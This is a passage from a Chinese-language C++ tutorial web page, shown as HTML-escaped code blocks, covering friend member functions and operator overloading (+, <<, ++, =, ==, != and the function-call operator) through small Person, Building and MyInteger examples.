class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::Building()</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_SittingRoom &#x3D; &quot;客厅&quot;;</span><br><span class="line">this-&gt;m_BedRoom &#x3D; &quot;卧室&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::goodGay()</span><br><span class="line">&#123;</span><br><span class="line">building &#x3D; new Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void goodGay::visit()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">goodGay gg;</span><br><span class="line">gg.visit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="成员函数做友元"><a href="#成员函数做友元" class="headerlink" title="成员函数做友元"></a>成员函数做友元</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">class Building;</span><br><span class="line">class goodGay</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">goodGay();</span><br><span class="line">void visit(); &#x2F;&#x2F;只让visit函数作为Building的好朋友，可以发访问Building中私有内容</span><br><span class="line">void visit2(); </span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">Building *building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Building</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;告诉编译器  goodGay类中的visit成员函数 是Building好朋友，可以访问私有内容</span><br><span class="line">friend void goodGay::visit();</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">Building();</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">string m_SittingRoom; &#x2F;&#x2F;客厅</span><br><span class="line">private:</span><br><span class="line">string m_BedRoom;&#x2F;&#x2F;卧室</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::Building()</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_SittingRoom &#x3D; &quot;客厅&quot;;</span><br><span class="line">this-&gt;m_BedRoom &#x3D; &quot;卧室&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::goodGay()</span><br><span class="line">&#123;</span><br><span class="line">building &#x3D; new Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void goodGay::visit()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void goodGay::visit2()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">goodGay  gg;</span><br><span class="line">gg.visit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><p>运算符重载概念：对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型</p><h3 id="加号运算符重载"><a href="#加号运算符重载" class="headerlink" title="加号运算符重载"></a>加号运算符重载</h3><p>作用：实现两个自定义数据类型相加的运算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line">Person() &#123;&#125;;</span><br><span class="line">Person(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_A &#x3D; a;</span><br><span class="line">this-&gt;m_B &#x3D; b;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;成员函数实现 + 号运算符重载</span><br><span class="line">Person operator+(const Person&amp; p) &#123;</span><br><span class="line">Person temp;</span><br><span class="line">temp.m_A &#x3D; this-&gt;m_A + p.m_A;</span><br><span class="line">temp.m_B &#x3D; this-&gt;m_B + p.m_B;</span><br><span class="line">return temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">int m_A;</span><br><span class="line">int m_B;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;全局函数实现 + 号运算符重载</span><br><span class="line">&#x2F;&#x2F;Person operator+(const Person&amp; p1, const Person&amp; p2) &#123;</span><br><span class="line">&#x2F;&#x2F;Person temp(0, 0);</span><br><span class="line">&#x2F;&#x2F;temp.m_A &#x3D; p1.m_A + p2.m_A;</span><br><span class="line">&#x2F;&#x2F;temp.m_B &#x3D; p1.m_B + p2.m_B;</span><br><span class="line">&#x2F;&#x2F;return temp;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;运算符重载 可以发生函数重载 </span><br><span class="line">Person operator+(const Person&amp; p2, int val)  </span><br><span class="line">&#123;</span><br><span class="line">Person temp;</span><br><span class="line">temp.m_A &#x3D; p2.m_A + val;</span><br><span class="line">temp.m_B &#x3D; p2.m_B + val;</span><br><span class="line">return temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void test() &#123;</span><br><span class="line"></span><br><span class="line">Person p1(10, 10);</span><br><span class="line">Person p2(20, 20);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;成员函数方式</span><br><span class="line">Person p3 &#x3D; p2 + p1;  &#x2F;&#x2F;相当于 p2.operaor+(p1)</span><br><span class="line">cout &lt;&lt; &quot;mA:&quot; &lt;&lt; p3.m_A &lt;&lt; &quot; mB:&quot; &lt;&lt; p3.m_B &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Person p4 &#x3D; p3 + 10; &#x2F;&#x2F;相当于 operator+(p3,10)</span><br><span class="line">cout &lt;&lt; &quot;mA:&quot; &lt;&lt; p4.m_A &lt;&lt; &quot; mB:&quot; &lt;&lt; p4.m_B &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结1：对于内置的数据类型的表达式的的运算符是不可能改变的</p></blockquote><blockquote><p>总结2：不要滥用运算符重载</p></blockquote><h3 id="左移运算符重载"><a href="#左移运算符重载" class="headerlink" title="左移运算符重载"></a>左移运算符重载</h3><p>作用：可以输出自定义数据类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Person&amp; p);</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">Person(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_A &#x3D; a;</span><br><span class="line">this-&gt;m_B &#x3D; b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;成员函数 实现不了  p &lt;&lt; cout 不是我们想要的效果</span><br><span class="line">&#x2F;&#x2F;void operator&lt;&lt;(Person&amp; p)&#123;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">int m_A;</span><br><span class="line">int m_B;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;全局函数实现左移重载</span><br><span class="line">&#x2F;&#x2F;ostream对象只能有一个</span><br><span class="line">ostream&amp; operator&lt;&lt;(ostream&amp; out, Person&amp; p) &#123;</span><br><span class="line">out &lt;&lt; &quot;a:&quot; &lt;&lt; p.m_A &lt;&lt; &quot; b:&quot; &lt;&lt; p.m_B;</span><br><span class="line">return out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void test() &#123;</span><br><span class="line"></span><br><span class="line">Person p1(10, 20);</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; p1 &lt;&lt; &quot;hello world&quot; &lt;&lt; endl; &#x2F;&#x2F;链式编程</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：重载左移运算符配合友元可以实现输出自定义数据类型</p></blockquote><h3 id="递增运算符重载"><a href="#递增运算符重载" class="headerlink" title="递增运算符重载"></a>递增运算符重载</h3><p>作用： 通过重载递增运算符，实现自己的整型数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">class MyInteger &#123;</span><br><span class="line"></span><br><span class="line">friend ostream&amp; operator&lt;&lt;(ostream&amp; out, MyInteger myint);</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">MyInteger() &#123;</span><br><span class="line">m_Num &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;前置++</span><br><span class="line">MyInteger&amp; operator++() &#123;</span><br><span class="line">&#x2F;&#x2F;先++</span><br><span class="line">m_Num++;</span><br><span class="line">&#x2F;&#x2F;再返回</span><br><span class="line">return *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;后置++</span><br><span class="line">MyInteger operator++(int) &#123;</span><br><span class="line">&#x2F;&#x2F;先返回</span><br><span class="line">MyInteger temp &#x3D; *this; &#x2F;&#x2F;记录当前本身的值，然后让本身的值加1，但是返回的是以前的值，达到先返回后++；</span><br><span class="line">m_Num++;</span><br><span class="line">return temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">int m_Num;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ostream&amp; operator&lt;&lt;(ostream&amp; out, MyInteger myint) &#123;</span><br><span class="line">out &lt;&lt; myint.m_Num;</span><br><span class="line">return out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;前置++ 先++ 再返回</span><br><span class="line">void test01() &#123;</span><br><span class="line">MyInteger myInt;</span><br><span class="line">cout &lt;&lt; ++myInt &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; myInt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;后置++ 先返回 再++</span><br><span class="line">void test02() &#123;</span><br><span class="line"></span><br><span class="line">MyInteger myInt;</span><br><span class="line">cout &lt;&lt; myInt++ &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; myInt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line">&#x2F;&#x2F;test02();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结： 前置递增返回引用，后置递增返回值</p></blockquote><h3 id="赋值运算符重载"><a href="#赋值运算符重载" class="headerlink" title="赋值运算符重载"></a>赋值运算符重载</h3><p>c++编译器至少给一个类添加4个函数</p><ol><li>默认构造函数(无参，函数体为空)</li><li>默认析构函数(无参，函数体为空)</li><li>默认拷贝构造函数，对属性进行值拷贝</li><li>赋值运算符 operator=, 对属性进行值拷贝</li></ol><p>如果类中有属性指向堆区，做赋值操作时也会出现深浅拷贝问题</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line">Person(int age)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;将年龄数据开辟到堆区</span><br><span class="line">m_Age &#x3D; new int(age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;重载赋值运算符 </span><br><span class="line">Person&amp; operator&#x3D;(Person &amp;p)</span><br><span class="line">&#123;</span><br><span class="line">if (m_Age !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">delete m_Age;</span><br><span class="line">m_Age &#x3D; NULL;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;编译器提供的代码是浅拷贝</span><br><span class="line">&#x2F;&#x2F;m_Age &#x3D; p.m_Age;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;提供深拷贝 解决浅拷贝的问题</span><br><span class="line">m_Age &#x3D; new int(*p.m_Age);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;返回自身</span><br><span class="line">return *this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">~Person()</span><br><span class="line">&#123;</span><br><span class="line">if (m_Age !&#x3D; NULL)</span><br><span class="line">&#123;</span><br><span class="line">delete m_Age;</span><br><span class="line">m_Age &#x3D; NULL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;年龄的指针</span><br><span class="line">int *m_Age;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">Person p1(18);</span><br><span class="line"></span><br><span class="line">Person p2(20);</span><br><span class="line"></span><br><span class="line">Person p3(30);</span><br><span class="line"></span><br><span class="line">p3 &#x3D; p2 &#x3D; p1; &#x2F;&#x2F;赋值操作</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;p1的年龄为：&quot; &lt;&lt; *p1.m_Age &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;p2的年龄为：&quot; &lt;&lt; *p2.m_Age &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;p3的年龄为：&quot; &lt;&lt; *p3.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;int a &#x3D; 10;</span><br><span class="line">&#x2F;&#x2F;int b &#x3D; 20;</span><br><span class="line">&#x2F;&#x2F;int c &#x3D; 30;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;c &#x3D; b &#x3D; a;</span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; &quot;c &#x3D; &quot; &lt;&lt; c &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="关系运算符重载"><a href="#关系运算符重载" class="headerlink" title="关系运算符重载"></a>关系运算符重载</h3><p><strong>作用：</strong>重载关系运算符，可以让两个自定义类型对象进行对比操作</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">Person(string name, int age)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;m_Name &#x3D; name;</span><br><span class="line">this-&gt;m_Age &#x3D; age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">bool operator&#x3D;&#x3D;(Person &amp; p)</span><br><span class="line">&#123;</span><br><span class="line">if (this-&gt;m_Name &#x3D;&#x3D; p.m_Name &amp;&amp; this-&gt;m_Age &#x3D;&#x3D; p.m_Age)</span><br><span class="line">&#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool operator!&#x3D;(Person &amp; p)</span><br><span class="line">&#123;</span><br><span class="line">if (this-&gt;m_Name &#x3D;&#x3D; p.m_Name &amp;&amp; this-&gt;m_Age &#x3D;&#x3D; p.m_Age)</span><br><span class="line">&#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string m_Name;</span><br><span class="line">int m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;int a &#x3D; 0;</span><br><span class="line">&#x2F;&#x2F;int b &#x3D; 0;</span><br><span class="line"></span><br><span class="line">Person a(&quot;孙悟空&quot;, 18);</span><br><span class="line">Person b(&quot;孙悟空&quot;, 18);</span><br><span class="line"></span><br><span class="line">if (a &#x3D;&#x3D; b)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;a和b相等&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;a和b不相等&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (a !&#x3D; b)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;a和b不相等&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;a和b相等&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数调用运算符重载"><a href="#函数调用运算符重载" class="headerlink" title="函数调用运算符重载"></a>函数调用运算符重载</h3><ul><li>函数调用运算符 () 也可以重载</li><li>由于重载后使用的方式非常像函数的调用，因此称为仿函数</li><li>仿函数没有固定写法，非常灵活</li></ul><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">class MyPrint</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">void operator()(string text)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; text &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">void test01()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;重载的（）操作符 也称为仿函数</span><br><span class="line">MyPrint myFunc;</span><br><span class="line">myFunc(&quot;hello world&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyAdd</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">int operator()(int v1, int v2)</span><br><span class="line">&#123;</span><br><span class="line">return v1 